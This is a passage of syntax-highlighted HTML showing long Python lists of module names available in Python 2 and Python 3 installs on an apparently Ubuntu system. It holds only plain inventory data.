class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;thread&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;dbhash&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;os2emxpath&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;tkColorChooser&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;tkCommonDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;tkFileDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tkFont&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tkMessageBox&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;tkSimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;toaiff&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_hotshot&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ensurepip&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;ttk&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;exceptions&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;fpformat&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;urlparse&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;_sha&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;future_builtins&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;rfc822&#x27;</span>, <span class="hljs-string">&#x27;xmllib&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>, <span class="hljs-string">&#x27;robotparser&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;hotshot&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;htmllib&#x27;</span>, <span class="hljs-string">&#x27;sets&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;sgmllib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;ihooks&#x27;</span>, <span class="hljs-string">&#x27;sha&#x27;</span><br>]<br><br>all_modules_3 = [<br>    <span class="hljs-string">&#x27;AptUrl&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;requests_unixsocket&#x27;</span>, <span class="hljs-string">&#x27;CommandNotFound&#x27;</span>, <span class="hljs-string">&#x27;apport&#x27;</span>, <span class="hljs-string">&#x27;hpmudext&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;Crypto&#x27;</span>, <span class="hljs-string">&#x27;apport_python_hook&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;DistUpgrade&#x27;</span>, <span class="hljs-string">&#x27;apt&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;HweSupportStatus&#x27;</span>, <span class="hljs-string">&#x27;apt_inst&#x27;</span>, <span class="hljs-string">&#x27;httplib2&#x27;</span>, <span class="hljs-string">&#x27;scanext&#x27;</span>, <span class="hljs-string">&#x27;LanguageSelector&#x27;</span>, <span class="hljs-string">&#x27;apt_pkg&#x27;</span>, <span class="hljs-string">&#x27;idna&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;NvidiaDetector&#x27;</span>, <span class="hljs-string">&#x27;aptdaemon&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;secrets&#x27;</span>, <span class="hljs-string">&#x27;PIL&#x27;</span>, <span class="hljs-string">&#x27;aptsources&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;secretstorage&#x27;</span>, <span class="hljs-string">&#x27;Quirks&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;UbuntuDrivers&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;selectors&#x27;</span>, <span class="hljs-string">&#x27;UbuntuSystemService&#x27;</span>, <span class="hljs-string">&#x27;asn1crypto&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;UpdateManager&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;ipaddress&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;asyncio&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;_asyncio&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;janitor&#x27;</span>, <span class="hljs-string">&#x27;simplejson&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;_blake2&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyring&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;_bootlocale&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;six&#x27;</span>, <span class="hljs-string">&#x27;_bz2&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;language_support_pkgs&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;_cffi_backend&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;launchpadlib&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;brlapi&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;socketserver&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;louis&#x27;</span>, <span class="hljs-string">&#x27;softwareproperties&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;speechd&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;lzma&#x27;</span>, <span class="hljs-string">&#x27;speechd_config&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;cairo&#x27;</span>, <span class="hljs-string">&#x27;macaroonbakery&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;_collections_abc&#x27;</span>, <span class="hljs-string">&#x27;certifi&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;_compat_pickle&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;_compression&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;_crypt&#x27;</span>, <span class="hljs-string">&#x27;chardet&#x27;</span>, <span class="hljs-string">&#x27;mako&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;markupsafe&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;statistics&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;_datetime&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;modual_test&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;_dbm&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;_dbus_bindings&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;nacl&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;_decimal&#x27;</span>, <span class="hljs-string">&#x27;concurrent&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;configparser&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;systemd&#x27;</span>, <span class="hljs-string">&#x27;_gdbm&#x27;</span>, <span class="hljs-string">&#x27;copyreg&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;cryptography&#x27;</span>, <span class="hljs-string">&#x27;oauth&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_imp&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;olefile&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;cups&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;cupsext&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;cupshelpers&#x27;</span>, <span class="hljs-string">&#x27;orca&#x27;</span>, <span class="hljs-string">&#x27;_lzma&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_markupbase&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;dbus&#x27;</span>, <span class="hljs-string">&#x27;pathlib&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;deb822&#x27;</span>, <span class="hljs-string">&#x27;pcardext&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_opcode&#x27;</span>, <span class="hljs-string">&#x27;debconf&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_operator&#x27;</span>, <span class="hljs-string">&#x27;debian&#x27;</span>, <span class="hljs-string">&#x27;pexpect&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;debian_bundle&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;_pickle&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>, <span class="hljs-string">&#x27;defer&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_pydecimal&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;pkg_resources&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;typing&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;distro_info&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;ufw&#x27;</span>, <span class="hljs-string">&#x27;_sha1&#x27;</span>, <span class="hljs-string">&#x27;distro_info_test&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_sha3&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;urllib3&#x27;</span>, <span class="hljs-string">&#x27;_signal&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;usbcreator&#x27;</span>, <span class="hljs-string">&#x27;_sitebuiltins&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;problem_report&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;enum&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;venv&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;faulthandler&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;wadllib&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;ptyprocess&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_stat&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_string&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pyatspi&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span 